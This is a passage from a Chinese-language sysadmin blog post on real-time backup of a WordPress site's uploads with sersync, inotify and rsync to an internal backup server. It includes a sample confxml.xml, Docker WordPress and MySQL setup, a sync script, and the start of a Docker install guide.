class="hljs-built_in">echo</span> 50000000 &gt; /proc/sys/fs/inotify/max_user_watches<br>execute：<span class="hljs-built_in">echo</span> 327679 &gt; /proc/sys/fs/inotify/max_queued_events<br>parse the <span class="hljs-built_in">command</span> param<br>_______________________________________________________<br>参数-d:启用守护进程模式<br>参数-r:在监控前，将监控目录与远程主机用rsync命令推送一遍<br>c参数-n: 指定开启守护线程的数量，默认为10个<br>参数-o:指定配置文件，默认使用confxml.xml文件<br>参数-m:单独启用其他模块，使用 -m refreshCDN 开启刷新CDN模块<br>参数-m:单独启用其他模块，使用 -m socket 开启socket模块<br>参数-m:单独启用其他模块，使用 -m http 开启http模块<br>不加-m参数，则默认执行同步程序<br>________________________________________________________________<br><br>2.执行程序，后台运行<br>./sersync2 -dro confxml.xml <br><br>ps aux | grep sersync2<br>[root@slave1 GNU-Linux-x86]<span class="hljs-comment">#ps aux | grep sersync2</span><br>root      11708  0.0  0.2  92324  4856 ?        Ssl  14:59   0:00 ./sersync2 -dro confxml.xml<br><br>3.查看同步效果<br>master写/data/nfs<br>nas服务器获取新数据，inotify监控<br>调用rsync同步到远端服务器<br>watch -n0.5 <span class="hljs-built_in">ls</span> -l /data/bak<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232751792-276836432.png" alt="image-20221003150955537"></p><h2 id="2-config-xml的写法"><a href="#2-config-xml的写法" class="headerlink" title="2.config.xml的写法"></a>2.config.xml的写法</h2><p>注释的为修改部分</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.5&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">host</span> <span class="hljs-attr">hostip</span>=<span class="hljs-string">&quot;localhost&quot;</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;8008&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">host</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">debug</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fileSystem</span> <span class="hljs-attr">xfs</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">exclude</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;(.*)\.svn&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">exclude</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;(.*)\.gz&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">exclude</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;^info/*&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">exclude</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;^static/*&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">inotify</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">createFolder</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">createFile</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">closeWrite</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">moveFrom</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">moveTo</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">attrib</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!--修改了属性后更新 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">modify</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">inotify</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">sersync</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">localpath</span> <span class="hljs-attr">watch</span>=<span class="hljs-string">&quot;/data/nfs-share1&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!--修改同步目录为/data/nfs-share1 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">remote</span> <span class="hljs-attr">ip</span>=<span class="hljs-string">&quot;10.0.0.132&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bak&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!--修改远端rsync备份服务器和备份目录/bak --&gt;</span><br>    <span class="hljs-comment">&lt;!--&lt;remote ip=&quot;192.168.8.39&quot; name=&quot;tongbu&quot;/&gt;--&gt;</span><br>    <span class="hljs-comment">&lt;!--&lt;remote ip=&quot;192.168.8.40&quot; name=&quot;tongbu&quot;/&gt;--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">localpath</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rsync</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">commonParams</span> <span class="hljs-attr">params</span>=<span class="hljs-string">&quot;-artuz&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">auth</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">users</span>=<span class="hljs-string">&quot;rsyncuser&quot;</span> <span class="hljs-attr">passwordfile</span>=<span class="hljs-string">&quot;/etc/rsync.pas&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!--鉴权用户名，调用本地的password文件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">userDefinedPort</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;874&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!-- 默认端口port=874 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">timeout</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">time</span>=<span class="hljs-string">&quot;100&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!-- timeout=100 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ssh</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!--禁用SSH协议 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rsync</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">failLog</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/tmp/rsync_fail_log.sh&quot;</span> <span class="hljs-attr">timeToExecute</span>=<span class="hljs-string">&quot;60&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--default every 60mins execute once--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">crontab</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">schedule</span>=<span class="hljs-string">&quot;600&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--600mins--&gt;</span> <span class="hljs-comment">&lt;!--先禁用定时任务 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">crontabfilter</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">exclude</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;*.php&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">exclude</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;info/*&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">crontabfilter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">crontab</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;command&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">sersync</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;command&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;/bin/sh&quot;</span> <span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">ignoreError</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--prefix /opt/tongbu/mmm.sh suffix--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;(.*)\.php&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;(.*)\.sh&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;socket&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">localpath</span> <span class="hljs-attr">watch</span>=<span class="hljs-string">&quot;/opt/tongbu&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">deshost</span> <span class="hljs-attr">ip</span>=<span class="hljs-string">&quot;192.168.138.20&quot;</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;8009&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">localpath</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;refreshCDN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">localpath</span> <span class="hljs-attr">watch</span>=<span class="hljs-string">&quot;/data0/htdocs/cms.xoyo.com/site/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cdninfo</span> <span class="hljs-attr">domainname</span>=<span class="hljs-string">&quot;ccms.chinacache.com&quot;</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;80&quot;</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-attr">passwd</span>=<span class="hljs-string">&quot;xxxx&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">sendurl</span> <span class="hljs-attr">base</span>=<span class="hljs-string">&quot;http://pic.xoyo.com/cms&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">regexurl</span> <span class="hljs-attr">regex</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;cms.xoyo.com/site([/a-zA-Z0-9]*).xoyo.com/images&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">localpath</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="基于LNMP架构搭建LB-web-mysql-nas架构，实现从web站点上传的图片自动同步"><a href="#基于LNMP架构搭建LB-web-mysql-nas架构，实现从web站点上传的图片自动同步" class="headerlink" title="基于LNMP架构搭建LB+web+mysql+nas架构，实现从web站点上传的图片自动同步"></a>基于LNMP架构搭建LB+web+mysql+nas架构，实现从web站点上传的图片自动同步</h1><p>环境：</p><p>10.0.0.128 apache+wordpress服务，数据库主库指向10.0.0.132，基于docker来安装，映射出来，docker安装wordpress</p><p>10.0.0.132 MySQL(主)，备份服务器</p><p>10.0.0.129 MySQL(从)，NAS服务器，NAS服务器指向</p><h2 id="1-docker搭建wordpress-MySQL"><a href="#1-docker搭建wordpress-MySQL" class="headerlink" title="1.docker搭建wordpress+MySQL"></a>1.docker搭建wordpress+MySQL</h2><p>docker run的时候，需要-v映射到nfs的共享目录，单个docker的映射目录()</p><p>还是直接docker run得了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull wordpress<br>docker run --name wordpress -p 8002:80 -v /apps/wordpress:/var/www/html/  -d wordpress<br><br><span class="hljs-comment">#docker run --name wordpress -p 8002:80 -v /apps/uploads:/var/www/html/wp-content/uploads  -d wordpress</span><br><br>docker stop `docker ps  | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>docker <span class="hljs-built_in">rm</span> -f `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br><br><span class="hljs-comment">##查看工作目录，查看从docker仓库下载下来的docker image镜像</span><br><span class="hljs-comment">##docker inspect imageID/image name，就是查看dockerfile</span><br>[root@master ~]<span class="hljs-comment">#docker inspect wordpress | grep -i working</span><br><span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;/var/www/html&quot;</span>,<br><br>[root@master ~]<span class="hljs-comment">#docker ps</span><br>CONTAINER ID   IMAGE       COMMAND                  CREATED         STATUS         PORTS                                   NAMES<br>974257bc8c36   wordpress   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   4 seconds ago   Up 3 seconds   0.0.0.0:8002-&gt;80/tcp, :::8002-&gt;80/tcp   wordpress<br><br>ss -ntl | grep 8002<br>LISTEN     0      128          *:8002                     *:*                  <br>LISTEN     0      128       [::]:8002                  [::]:*      <br><br>10.0.0.128:8002<br><br><span class="hljs-comment">##MySQL操作，需要提前建库和用户</span><br><span class="hljs-comment">##所有的建站信息全部存放在表里</span><br><br>[(none)]&gt;create database wordpress;<br>Query OK, 1 row affected (0.01 sec)<br><br>[(none)]&gt;grant all on wordpress.* to wp@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, 0 rows affected (0.01 sec)<br><br>[(none)]&gt;flush privileges;<br>Query OK, 0 rows affected (0.00 sec)<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232749632-1054540650.png" alt="image-20221003210709016"></p><h2 id="2-rsync直接同步uploads目录到备份机-wp"><a href="#2-rsync直接同步uploads目录到备份机-wp" class="headerlink" title="2.rsync直接同步uploads目录到备份机[wp]"></a>2.rsync直接同步uploads目录到备份机[wp]</h2><p>docker搭建映射出来的路径，不能再进行一次挂载，所以说API服务器有两个，IP+相同的端口号，uploads的rsync直接指向到10.0.0.132的复制目录，/data/bak</p><p>[root@master uploads]#exportfs -r<br>exportfs: /apps/wordpress/wp-content/uploads does not support NFS export</p><p>如果是多个web前端的话，程序可以控制写到LB的IP，负载均衡两个WEB，两个WEB的图片备份都指向备份机器，且两台WEB之间同步图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##安装rsync工具和inotify-tools工具</span><br>rpm -q rsync &amp;&gt; /dev/null  || yum -y install rsync<br>rpm -q inotify-tools &amp;&gt; /dev/null  || yum -y install inotify-tools<br><br><span class="hljs-comment">#1.站点图片目录，有记录日期，直接同步这个文件夹，发布新文章，新图片上面都有</span><br>/apps/wordpress/wp-content/uploads<br><br>[root@master 10]<span class="hljs-comment">#ls</span><br>0923test-01-1024x640.jpg  0923test-01-300x188.jpg  0923test-01.jpg     image-150x150.png   image-1568x842.png  image-768x412.png<br>0923test-01-150x150.jpg   0923test-01-768x480.jpg  image-1024x550.png  image-1536x825.png  image-300x161.png   image.png<br><br><span class="hljs-comment">#2.直接使用sersync或者是脚本同步uploads到备份服务器10.0.0.132</span><br>scp sersync2.5.4_64bit_binary_stable_final.tar.gz 10.0.0.128:/root<br>tar xf sersync2.5.4_64bit_binary_stable_final.tar.gz /apps/sersync<br><br><span class="hljs-comment">#3.编辑xml文件</span><br>vim confxml.xml<br>&lt;sersync&gt;<br>        &lt;localpath watch=<span class="hljs-string">&quot;/apps/wordpress/wp-content/uploads&quot;</span>&gt; &lt;!--/apps/wordpress/wp-content/uploads --&gt;<br>            &lt;remote ip=<span class="hljs-string">&quot;10.0.0.132&quot;</span> name=<span class="hljs-string">&quot;wp&quot;</span>/&gt; &lt;!--修改远端rsync备份服务器和备份目录 --&gt;<br>        &lt;/localpath&gt;<br>        &lt;rsync&gt;<br>            &lt;commonParams params=<span class="hljs-string">&quot;-artuz&quot;</span>/&gt;<br>            &lt;auth start=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-built_in">users</span>=<span class="hljs-string">&quot;rsyncuser&quot;</span> passwordfile=<span class="hljs-string">&quot;/etc/rsync.pas&quot;</span>/&gt; &lt;!--鉴权用户名，调用本地的password文件 --&gt;<br><br><span class="hljs-comment">#4.编辑备份端</span><br>rpm -q rsync &amp;&gt; /dev/null  || yum -y install rsync<br><br>vim /etc/rsyncd.conf<br>[wp]<br>path = /data/wordpress/<br><span class="hljs-comment">##记得要写path/</span><br><span class="hljs-built_in">read</span> only = no<br><span class="hljs-comment">##不只读，可写</span><br>auth <span class="hljs-built_in">users</span> = rsyncuser<br><span class="hljs-comment">##默认用户</span><br>secrets file = /etc/rsync.pas<br><span class="hljs-comment">##默认密码</span><br><br><span class="hljs-comment">##重启服务</span><br>systemctl restart rsyncd<br><br><span class="hljs-comment">#5.运行脚本，监控/data/wordpress/2022/10/的变化</span><br><span class="hljs-comment">#同步前先进行scp同步一遍先</span><br>scp /apps/wordpress/wp-content/uploads/* 10.0.0.132:/data/wordpress/<br><br><span class="hljs-comment">#执行脚本</span><br>master:[root@master GNU-Linux-x86]<span class="hljs-comment">#./sersync2 -dro confxml.xml</span><br><span class="hljs-built_in">nohup</span> ./sersync2 -dro confxml.xml<br><br>ps aux | grep ser<br>root      13227  0.0  0.0 125108   712 ?        Ssl  23:02   0:00 ./sersync2 -dro confxml.xml<br><br><span class="hljs-comment">##监控变化</span><br>backup:watch -n0.5 ll /data/wordpress/2022/10/<br><br>在wordpress站点发布图片，图片名字为10044444test.jpg<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232752358-113014360.png" alt="image-20221003233819624"></p><h2 id="3-rsync使用脚本-在没有包的情况下，常用"><a href="#3-rsync使用脚本-在没有包的情况下，常用" class="headerlink" title="3.rsync使用脚本(在没有包的情况下，常用)"></a>3.rsync使用脚本(在没有包的情况下，常用)</h2><p>顺便安装了rsync和inotify，可以作为定时任务，或者nohup也行</p><p>缺点：调用多次rsync，有点小毛病，调用多次create，attribu等指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim inotify_rsync.sh<br><span class="hljs-built_in">nohup</span> ./inotify_rsync.sh<br><br><span class="hljs-comment">##监控NAS目录的变化</span><br>SRC=<span class="hljs-string">&#x27;/apps/wordpress/wp-content/uploads/&#x27;</span><br><span class="hljs-comment">##备份服务器为132的bak，调用rsync的协议</span><br>DEST=<span class="hljs-string">&#x27;rsyncuser@10.0.0.132::wp&#x27;</span><br><br>rpm -q rsync &amp;&gt; /dev/null  || yum -y install rsync<br>rpm -q inotify-tools &amp;&gt; /dev/null  || yum -y install inotify-tools<br><br><span class="hljs-comment">#修改参数，监控文件数量</span><br><span class="hljs-built_in">echo</span> 50000000 &gt; /proc/sys/fs/inotify/max_user_watches<br><span class="hljs-built_in">echo</span> 327679 &gt; /proc/sys/fs/inotify/max_queued_events<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;starting monitor file change...&quot;</span><br><span class="hljs-built_in">sleep</span> 2<br><span class="hljs-comment">#持续前台监控特定事件,定义时间格式、日期格式、动作(新建、删除、移动---重命名、写入、权限变化) + nas目录，输入到while内</span><br>inotifywait  -mrq  --exclude=<span class="hljs-string">&quot;.*\.swp&quot;</span> --timefmt <span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span> --format <span class="hljs-string">&#x27;%T %w %f&#x27;</span> -e create,delete,moved_to,close_write,attrib <span class="hljs-variable">$&#123;SRC&#125;</span> |<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> DATE TIME DIR FILE;<span class="hljs-keyword">do</span><br>        FILEPATH=<span class="hljs-variable">$&#123;DIR&#125;</span><span class="hljs-variable">$&#123;FILE&#125;</span><br>        <span class="hljs-comment">##表示新建=新建，删除=删除</span><br>        rsync -az --delete  --password-file=/etc/rsync.pas <span class="hljs-variable">$SRC</span> <span class="hljs-variable">$DEST</span> <br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;At <span class="hljs-variable">$&#123;TIME&#125;</span> on <span class="hljs-variable">$&#123;DATE&#125;</span>, file <span class="hljs-variable">$FILEPATH</span> was backuped up via rsync&quot;</span> &gt;&gt; /var/log/changelist.log<br>        <span class="hljs-comment">#日志在129上面，在129上执行的脚本</span><br><span class="hljs-keyword">done</span><br><br>Every 0.5s: tree /data/wordpress/2022/10/  <br>├── test11-1024x640.jpg<br>├── test11-150x150.jpg<br>├── test11-300x188.jpg<br>├── test11-768x480.jpg<br></code></pre></td></tr></table></figure><h2 id="nohup-英文全称-no-hang-up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。"><a href="#nohup-英文全称-no-hang-up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。" class="headerlink" title="nohup 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。"></a><strong>nohup</strong> 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。</h2><h2 id="4-负载均衡架构"><a href="#4-负载均衡架构" class="headerlink" title="4.负载均衡架构"></a>4.负载均衡架构</h2><p>nginx：前端负载均衡</p><p>web01，web02：docker部署</p><p>备份服务器：web01和web02互相使用rsync脚本同步，同步前先完成一遍复制确保一致</p><p>web01和web02再备份一次到备份服务器</p><p>3方—4方—多方同步解决</p><p>目前只能实现docker单节点部署wordpress，通过脚本自动备份到远端132的机器</p><p>1.环境：可以在slave1上面搭建web02站点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">搭建docker环境，搭建私有仓库<br>1.关闭防火墙，SELINUX<br>sed <span class="hljs-string">&#x27;s/enable/disabled/g&#x27;</span> /etc/config/selinux<br><br>2.卸载旧版本的docker包<br>rpm -qa | grep docker<br>yum -y remove docker*，删除掉所有的依赖<br><br>3.docker安装存储库<br>yum install -y yum-utils device-mapper-persistent-data lvm2<br><br>4.添加阿里云的yum源<br>    yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<br>修改内部的gpgcheck<br>:%s/gpgcheck=1/gpgcheck=0/g<br>sed -i <span class="hljs-string">&#x27;s/gpgcheck=1/gpgcheck=0/g&#x27;</span> /etc/yum.repos.d/docker-ce.repo<br><br>5.安装docker-ce<br>yum install docker-ce docker-ce-cli containerd.io -y<br><br>scp -r /etc/docker/* 